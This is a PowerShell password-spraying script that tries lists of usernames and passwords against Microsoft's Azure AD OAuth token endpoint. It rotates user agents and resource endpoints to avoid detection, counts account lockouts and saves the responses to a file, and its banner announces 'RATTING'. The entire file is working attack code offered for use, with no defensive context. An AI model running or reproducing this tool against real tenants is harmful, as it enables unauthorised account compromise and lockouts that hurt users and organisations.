Param(
    [Parameter(Mandatory = $False,
        Position = 0)]
    [array]$UserList = "",

    [Parameter(Mandatory = $False,
        Position = 1)]
    [array]$Passwords = "",

    [Parameter(Mandatory = $False,
        Position = 3)]
    [string]$OutFile = "",

    [Parameter(Mandatory = $False,
        Position = 4)]
    [switch]$Force
)

$logo = '   
                                         ╓╓╓╖╖╖╖╖╓╓╓┌                              
         └└ ╙╙╙╩╦╖╖┌                 ╒╓╬╬╬╬╬╫╬╬╬╬╬╬╬╬╬╬╬╬╦╥╥╖╬╬╬╖                   
                   └╙╙┬╦╖╓╓┌┌  ╓╓╓╓╦╦╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╫╬╜╬╬╬╖                
                          └└╙╙╙╙╙└└   ╟╬╬╬╬╬╫╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╖             
                                      ╬╙╨╨╩╬╬╬╬╩╩╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╩╩╨╬╨╩╙
                                       ╙╙└          ╙╘┘      └╙╙╙╙

                                       
                -- L E T S   S T A R T   R A T T I N G --
'

Clear-Host
Write-Host $logo -ForegroundColor Green

$constants = Get-Content "constants.json" | ConvertFrom-Json

$ErrorActionPreference = 'silentlycontinue'
$usernames = $UserList | Sort-Object { Get-Random }
$currenttime = Get-Date
$count = $Usernames.count
$curr_user = 0
$lockout_count = 0
$lockoutquestion = 0
$dataHash = New-Object System.Collections.ArrayList
$script:fullresults = @()

if ($PasswordList) {
    $Passwords = Get-Content $PasswordList
}
Write-Host -ForegroundColor "yellow" ("[*] There are " + $count + " total users to spray.")
Write-Host -ForegroundColor "yellow" "[*] Current date and time: $currenttime"

# Setting up the web request
$requestParams = @{
    Method = 'POST'
    Uri    = "https://login.microsoftonline.com/common/oauth2/token"
    Body   = @{
        resource    = ''
        client_info = '1'
        grant_type  = 'password'
        client_id   = '1b730954-1685-4b74-9bfd-dac224a7b894'
        scope       = 'openid'
    }
}

foreach ($username in $usernames) {
    # User counter
    $curr_user += 1
    Write-Host -nonewline "$curr_user of $count users tested`r"

    $requestParams.Body.username = $username
    $requestParams.Body.resource = ( $constants.endpoints.value | Get-Random )
    
    foreach ($password in $Passwords ) {
        $agent = ($constants.agents.value | Get-Random)
        $requestParams.Body.password = "$password"
        $null = Invoke-WebRequest @requestParams -ErrorVariable ErrMsg -UserAgent $agent
    }

    # If we get a 200 response code it's a valid cred
        
    $currentItem = [PSCustomObject]@{
        "username"    = $requestParams.Body.username
        "password"    = "$requestParams.Body.password"
        "agent"       = $agent
        "endpoint"    = $requestParams.Body.resource
        "ErrorMsg"    = ((($ErrMsg.ErrorRecord | ConvertFrom-Json).error_description) -split '\n')[0]
    }

    if ($currentItem.ErrorMsg -like "*50053*" ) {
        $lockout_count++
    }
    
    $null = $dataHash.Add($currentItem)

    if (!$Force -and $lockout_count -eq 5 -and $lockoutquestion -eq 0) {
        $title = "WARNING! Multiple Account Lockouts Detected!"
        $message = "5 of the accounts you sprayed appear to be locked out. Do you want to continue this spray?"

        $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
            "Continues the password spray."

        $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
            "Cancels the password spray."

        $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)

        $result = $host.ui.PromptForChoice($title, $message, $options, 0)
        $lockoutquestion++
        if ($result -ne 0) {
            Write-Host "[*] Cancelling the password spray."
            Write-Host "NOTE: If you are seeing multiple 'account is locked' messages after your first 5 attempts or so this may indicate Azure AD Smart Lockout is enabled."
            break
        }
    }
}

# Output to file
if ($OutFile) {
    if ($dataHash) {
        $dataHash | Out-File $OutFile
        Write-Host -ForegroundColor "yellow" "[*] Results have been written to [$OutFile]."
    }
} else {
    return $dataHash
}
